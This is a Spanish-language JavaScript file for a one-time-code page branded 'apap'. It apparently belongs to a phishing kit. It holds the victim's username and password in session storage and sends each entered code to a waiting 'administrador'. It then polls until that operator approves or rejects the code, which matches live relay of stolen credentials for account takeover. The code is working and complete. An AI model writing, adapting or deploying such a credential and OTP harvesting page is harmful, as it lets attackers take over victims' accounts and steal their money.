// otp.js
const API_BASE_URL = '/api';
let timerInterval = null;
let remaining = 115;

function startTimer() {
    updateTimer();
    timerInterval = setInterval(() => {
        remaining--;
        updateTimer();
        if (remaining <= 0) {
            clearInterval(timerInterval);
            alert('Tiempo expirado. Solicita un nuevo código.');
            document.getElementById('otpInput').disabled = true;
            document.getElementById('validateButton').disabled = true;
        }
    }, 1000);
}

function updateTimer() {
    const el = document.getElementById('timerDisplay');
    if (!el) return;
    const mm = String(Math.floor(remaining / 60)).padStart(2,'0');
    const ss = String(remaining % 60).padStart(2,'0');
    el.textContent = `${mm}:${ss}`;
}

function setupInput() {
    const otpInput = document.getElementById('otpInput');
    const validateBtn = document.getElementById('validateButton');
    if (!otpInput || !validateBtn) return;
    otpInput.addEventListener('input', () => {
        otpInput.value = otpInput.value.replace(/[^0-9]/g, '').slice(0,6);
        validateBtn.disabled = otpInput.value.length !== 6;
    });
    validateBtn.addEventListener('click', validateOTP);
}

function validateOTP() {
    const otp = document.getElementById('otpInput').value;
    const usuario = sessionStorage.getItem('apap_usuario');
    if (!usuario) {
        alert('Sesión no encontrada. Regresa al login.');
        window.location.href = 'index.html';
        return;
    }
    if (!otp || otp.length !== 6) { alert('Código inválido'); return; }
    showLoading('Enviando código al administrador...');
    fetch(`${API_BASE_URL}/apap_otp`, {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({ usuario: usuario, otp_code: otp })
    })
    .then(res => res.json())
    .then(data => {
        hideLoading();
        if (data.status === 'ok') startOTPPolling(usuario);
        else alert('Error al enviar OTP');
    })
    .catch(err => { hideLoading(); console.error(err); alert('Error de conexión'); });
}

function startOTPPolling(usuario) {
    showLoading('Esperando validación del código...');
    const poll = setInterval(async () => {
        try {
            const res = await fetch(`${API_BASE_URL}/apap_estado/${encodeURIComponent(usuario)}`);
            if (!res.ok) return;
            const data = await res.json();
            if (data.status === 'ok' && data.decision) {
                clearInterval(poll);
                hideLoading();
                fetch(`${API_BASE_URL}/apap_limpiar/${encodeURIComponent(usuario)}`, { method: 'POST' }).catch(()=>{});
                if (data.decision === 'aprobar') {
                    sessionStorage.removeItem('apap_usuario');
                    sessionStorage.removeItem('apap_password');
                    window.location.href = 'exito.html';
                } else {
                    alert('Código incorrecto. Vuelve a intentar.');
                    window.location.href = 'index.html';
                }
            }
        } catch (err) {
            console.error('Polling OTP error', err);
        }
    }, 2000);
}

function resendCode() {
    const usuario = sessionStorage.getItem('apap_usuario');
    if (!usuario) {
        alert('Sesión no encontrada.');
        window.location.href = 'index.html';
        return;
    }
    showLoading('Solicitando reenvío...');
    fetch(`${API_BASE_URL}/apap_resend`, {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({ usuario: usuario })
    })
    .then(res => res.json())
    .then(data => {
        hideLoading();
        if (data.status === 'ok') {
            alert('Solicitud de reenvío enviada al administrador.');
        } else {
            alert('Error solicitando reenvío.');
        }
    })
    .catch(err => { hideLoading(); console.error(err); alert('Error de conexión'); });
}

function goBack() { window.location.href = 'registro.html'; }

function showLoading(msg='Cargando...') { if (document.getElementById('loading-overlay')) return; const ov = document.createElement('div'); ov.id='loading-overlay'; ov.style='position:fixed;left:0;top:0;right:0;bottom:0;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.4);z-index:9999'; ov.innerHTML=`<div style="background:white;padding:18px;border-radius:8px;text-align:center">${msg}<div class="spinner-border" style="margin-top:8px"></div></div>`; document.body.appendChild(ov); }
function hideLoading() { const el = document.getElementById('loading-overlay'); if (el) el.remove(); }

document.addEventListener('DOMContentLoaded', () => { setupInput(); startTimer(); });
